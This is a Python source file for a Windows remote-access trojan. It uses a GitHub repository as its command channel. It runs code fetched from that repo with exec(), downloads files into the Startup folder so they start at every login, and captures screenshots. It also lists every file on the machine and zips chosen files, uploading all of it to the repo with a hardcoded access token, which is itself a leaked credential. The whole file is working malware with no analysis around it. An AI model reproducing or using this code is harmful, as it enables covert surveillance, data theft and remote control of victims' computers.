from datetime import datetime
from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd , remove
from shutil import move , copy , copytree
from time import sleep
from github import Github
import base64
import subprocess
import git
import pyautogui
import requests
import json
import win32api
import zipfile

# _____(end import)_____ #
TOKEN = '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'
chdir(getcwd())
# _____(function)_____ #
try:
    def download(url: str, dest_folder: str):
        response = requests.get(url, stream=True)
        if response.ok:
            filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
            file_path = path.join(dest_folder, filename)
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk), f.flush(), fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            pass


    def move_file(path):
        path = environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs{path}"
        try:
            for i in (listdir("software")):
                move(fr"software\{i}", path)
        except:pass

    #__________(deleted)__________#
    # __________(deleted)__________#

    def send_main_information(TOKEN, content, name_file_to_site):
        sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                           headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
        content_base64 = base64.b64encode(content.encode()).decode()  # Encode content to Base64
        data = {"content": content_base64, "message": "data", "sha": sha}
        data = json.dumps(data)
        main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}", data=data,
                            headers={"Authorization": f"token {TOKEN}"})

    def Rmpydir():
        system("rmdir /s /q python")

        ########
    def send_file_to_git(TOKEN, content, name_file_to_site):
        sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                           headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
        content_base64 = base64.b64encode(content).decode()  # Encode content to Base64
        data = {"content": content_base64, "message": "data", "sha": sha}
        data = json.dumps(data)
        main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                            data=data,
                            headers={"Authorization": f"token {TOKEN}"})

    def create_zip_from_folder(folder_path, zip_filename):
        # ایجاد یک فایل ZIP جدید
        with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as new_zip:
            # پیمایش بر روی تمام فایل‌ها و زیرپوشه‌ها در پوشه
            for root, _, files in walk(folder_path):
                for file in files:
                    file_path = path.join(root, file)
                    # اضافه کردن فایل به فایل ZIP
                    new_zip.write(file_path, arcname=path.relpath(file_path, folder_path))
        ########

except:pass


def connected_to_internet(url='http://www.google.com/', timeout=5):
    try:
        _ = requests.head(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        return False


# _____(function)_____#

while True:
    try:
        if path.exists("python"):
            Rmpydir()
        while connected_to_internet():
            Rmpydir()
            if not path.exists("python"): git.Git().clone("https://github.com/ehsanmehran/python")
            if path.exists("python/result_condition.ini"):
                with open(file="python/result_condition.ini" , mode="r") as f:
                    exec(f.read())
            else:
                sleep(5)
                continue

            if result_condition == "link":
                with open(file="python/link.ini", mode="r") as f:
                    exec(f.read())
                if not path.exists("software"):mkdir("software")
                download(url=link, dest_folder="software")
                send_main_information(TOKEN=TOKEN , content="result_condition = False" , name_file_to_site="result_condition.ini")# send_condition(TOKEN)
                move_file("\Startup")
                Rmpydir()
                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")# last_visit(TOKEN)


            elif result_condition == "one_line_commands":
                with open(file="python/one_line_commands.ini", mode="r") as f:
                    exec(f.read())
                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")# send_condition(TOKEN)
                Rmpydir()
                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")# last_visit(TOKEN)


            elif result_condition == "camera":
                myscreen = pyautogui.screenshot().save('screen.png')
                with open("screen.png", "rb") as image2string:
                    converted_string = base64.b64encode(image2string.read())
                with open('code_image.ini', "wb") as file:
                    file.write(converted_string)
                with open(file="code_image.ini", mode="r") as f:
                    send_main_information(TOKEN=TOKEN, content=str(f.read()),name_file_to_site="code_image.ini")#code_image(TOKEN)
                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")# send_condition(TOKEN)
                remove("screen.png")
                remove("code_image.ini")
                Rmpydir()
                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)

            elif result_condition == "scan_system":
                if not path.exists("path"):
                    mkdir("path")
                else:
                    system("rmdir /s /q path")
                    mkdir("path")
                drives = win32api.GetLogicalDriveStrings()
                drives = drives.split('\000')[:-1]
                for i in drives:
                    if i == "C:\\": i = i + "Users"
                    with open(f"path\\{list(i)[0]}.ini", mode="w+", encoding="utf8") as f:
                        for root, dirs, files in walk(i):
                            for file in files:
                                f.write(f"{path.join(root, file)}" + "\n")
                create_zip_from_folder(folder_path="path", zip_filename="path.zip")
                with open("path.zip", "rb") as f:
                    with open("path.ini", "wb") as r:
                        r.write(f.read())
                        with open("path.ini", "rb") as f:
                            send_file_to_git(TOKEN=TOKEN, content=f.read(), name_file_to_site="scan_path.ini")
                remove_path = ["path.zip", "path.ini"]
                for i in remove_path:
                    remove(i)
                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                Rmpydir()
                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)

            elif result_condition == "send_file":
                if path.exists(r"python\file_path.ini"):
                    with open(file=r"python\file_path.ini", mode="r", encoding="utf8") as f:
                        exec(f.read())
                    if not path.exists('file'): mkdir("file")
                    if len(path_file) != 0:
                        for i in path_file:
                            if path.isfile(i):
                                copy(i, r"file")
                            elif path.isdir(i):
                                copytree(i , r"file")
                        create_zip_from_folder("file", "file.zip")
                        with open("file.zip", "rb") as f:
                            with open("file.ini", "wb") as r:
                                r.write(f.read())
                            with open("file.ini", "rb") as f:
                                send_file_to_git(TOKEN=TOKEN, content=f.read(),name_file_to_site="download_file.ini")
                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                Rmpydir()
                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
                delete = ["file.ini" , "file.zip" , "file"]
                for i in delete:
                    remove(fr"{i}")

            else:
                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini") # last_visit(TOKEN)
                sleep(300)
    except:
        sleep(5)
        continue